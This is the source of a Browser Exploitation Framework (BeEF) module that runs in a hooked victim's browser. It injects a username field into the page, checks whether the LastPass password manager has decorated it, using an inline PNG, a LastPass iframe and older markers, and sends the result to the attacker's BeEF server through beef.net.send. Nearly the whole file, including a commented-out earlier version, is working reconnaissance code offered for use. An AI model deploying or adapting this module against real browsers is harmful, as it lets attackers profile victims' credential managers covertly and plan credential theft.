//
// Copyright (c) 2006-2022 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function () {
	var result = "Not in use or not installed";

	let createInputField = function() {
		beef.debug("Module - Detect LastPass: Generating input field");

		return new Promise((resolve, reject) => {
			var input = document.createElement("input");
			input.type = "text";
			input.id = "username";
			input.name = "username";
			// input.style.display = "none";
			// input.setAttribute("style", "position:absolute;visibility:hidden;top:-1000px;left:-1000px;width:1px;height:1px;border:none;");
			document.body.appendChild(input);
			beef.debug("Module - Detect LastPass: Input field generated");
			resolve({message: "Input field generated", input: input});
		}) 
	}

	let detectLastPass = function(data) {
		beef.debug("Module - Detect LastPass: Looking for input field");

		return new Promise((resolve, reject) => {
			// The following base64 encoded string represents the LastPass inline PNG which is inserted into user/pass form fields
			var base64PNG = "iVBORw0KGgoAAAANSUhEUgAAABAAAAASCAYAAABSO15qAAAAAXNSR0IArs4c6QAAAPhJREFUOBHlU70KgzAQPlMhEvoQTg6OPoOjT+JWOnRqkUKHgqWP4OQbOPokTk6OTkVULNSLVc62oJmbIdzd95NcuGjX2/3YVI/Ts+t0WLE2ut5xsQ0O+90F6UxFjAI8qNcEGONia08e6MNONYwCS7EQAizLmtGUDEzTBNd1fxsYhjEBnHPQNG3KKTYV34F8ec/zwHEciOMYyrIE3/ehKAqIoggo9inGXKmFXwbyBkmSQJqmUNe15IRhCG3byphitm1/eUzDM4qR0TTNjEixGdAnSi3keS5vSk2UDKqqgizLqB4YzvassiKhGtZ/jDMtLOnHz7TE+yf8BaDZXA509yeBAAAAAElFTkSuQmCC";

			// Detect input form fields with the injected LastPass PNG as background image
			var bginput = $j('input[style]');
			var lpdiv = document.getElementById('hiddenlpsubmitdiv');
			if (bginput.length > 0) {
				beef.debug("Module - Detect LastPass: Input field with 'style' attribute found: " + bginput);
				for (var i = 0; i < bginput.length; i++) {
					beef.debug("Module - Detect LastPass: Number of potential input fields with 'style' attribute found: " + bginput.length);
					var styleContent = bginput[i].getAttribute('style');
					if (styleContent.includes(base64PNG)) {
						beef.debug('Module - Detect LastPass: Matching inline PNG detected');
						result = "Detected LastPass through presence of inline base64-encoded PNG within input form field";
					}
				}
				beef.debug(result)
				// Detect presence of LastPass iframe
			} else if ($j("iframe[name='LPFrame']").length > 0) {
				beef.debug('Module - Detect LastPass: Matching iframe found');
				result = "Detected LastPass through presence of LastPass 'save password' iframe";
				// Below is the older method of LastPass detection method
			} else if (typeof (lpdiv) != 'undefined' && lpdiv != null) {
				result = "Detected LastPass through presence of the <script> tag with id=hiddenlpsubmitdiv";
			} else if ($j("script:contains(lastpass_iter)").length > 0) {
				result = "Detected LastPass through presense of the embedded <script> which includes references to lastpass_iter";
			}
			beef.debug(result)
			resolve({message: "LastPass detection complete", result: result});	
		}
		)
	}

	let getResult = function(data) {
		beef.debug("Module - Detect LastPass: Getting result");

		return new Promise((resolve, reject) => {
			beef.net.send("<%= @command_url %>", <%= @command_id %>, "result="+result);
		});
	}

	createInputField().then(detectLastPass).then(getResult);
	// createInputField();
	// detectLastPass();

	

	// function createInputField() {
	// 	create_input = function () {
	// 		beef.debug('Module - Detect LastPass: Generating input field');
	
	// 		var u_input = document.createElement('input');
	// 		u_input.setAttribute("id", "username");
	// 		u_input.setAttribute("name", "username");
	// 		// u_input.setAttribute("style", "position:absolute;visibility:hidden;top:-1000px;left:-1000px;width:1px;height:1px;border:none;");
	// 		u_input.setAttribute("type", "text");
	// 		document.body.appendChild(u_input);
	// 	}
	
	// 	create_input();
	// 	beef.debug('Module - Detect LastPass: Trigger input field update');
	// 	$j("#username").click();
	// 	setTimeout(function () {
	// 		detectLastPass();		
	// 	}, 1000);
		
	// }

	// function detectLastPass() {
	// 	beef.debug("Module - Detect LastPass: Looking for input field");
	// 	// The following base64 encoded string represents the LastPass inline PNG which is inserted into user/pass form fields
	// 	var base64PNG = "iVBORw0KGgoAAAANSUhEUgAAABAAAAASCAYAAABSO15qAAAAAXNSR0IArs4c6QAAAPhJREFUOBHlU70KgzAQPlMhEvoQTg6OPoOjT+JWOnRqkUKHgqWP4OQbOPokTk6OTkVULNSLVc62oJmbIdzd95NcuGjX2/3YVI/Ts+t0WLE2ut5xsQ0O+90F6UxFjAI8qNcEGONia08e6MNONYwCS7EQAizLmtGUDEzTBNd1fxsYhjEBnHPQNG3KKTYV34F8ec/zwHEciOMYyrIE3/ehKAqIoggo9inGXKmFXwbyBkmSQJqmUNe15IRhCG3byphitm1/eUzDM4qR0TTNjEixGdAnSi3keS5vSk2UDKqqgizLqB4YzvassiKhGtZ/jDMtLOnHz7TE+yf8BaDZXA509yeBAAAAAElFTkSuQmCC";

	// 	// Detect input form fields with the injected LastPass PNG as background image
	// 	var bginput = $j('input[style]');
	// 	var lpdiv = document.getElementById('hiddenlpsubmitdiv');
	// 	if (bginput.length > 0) {
	// 		beef.debug("Module - Detect LastPass: Input field with 'style' attribute found: " + bginput);
	// 		for (var i = 0; i < bginput.length; i++) {
	// 			beef.debug("Module - Detect LastPass: Number of potential input fields with 'style' attribute found: " + bginput.length);
	// 			var styleContent = bginput[i].getAttribute('style');
	// 			if (styleContent.includes(base64PNG)) {
	// 				beef.debug('Module - Detect LastPass: Matching inline PNG detected');
	// 				result = "Detected LastPass through presence of inline base64-encoded PNG within input form field";
	// 			}
	// 		}
	// 		// Detect presence of LastPass iframe
	// 	} else if ($j("iframe[name='LPFrame']").length > 0) {
	// 		beef.debug('Module - Detect LastPass: Matching iframe found');
	// 		result = "Detected LastPass through presence of LastPass 'save password' iframe";
	// 		// Below is the older method of LastPass detection method
	// 	} else if (typeof (lpdiv) != 'undefined' && lpdiv != null) {
	// 		result = "Detected LastPass through presence of the <script> tag with id=hiddenlpsubmitdiv";
	// 	} else if ($j("script:contains(lastpass_iter)").length > 0) {
	// 		result = "Detected LastPass through presense of the embedded <script> which includes references to lastpass_iter";
	// 	}
	// 	getResult();
	// }

	// function getResult() {
	// 	beef.net.send("<%= @command_url %>", <%= @command_id %>, "lastpass=" + result);
	// }

	// createInputField();

});
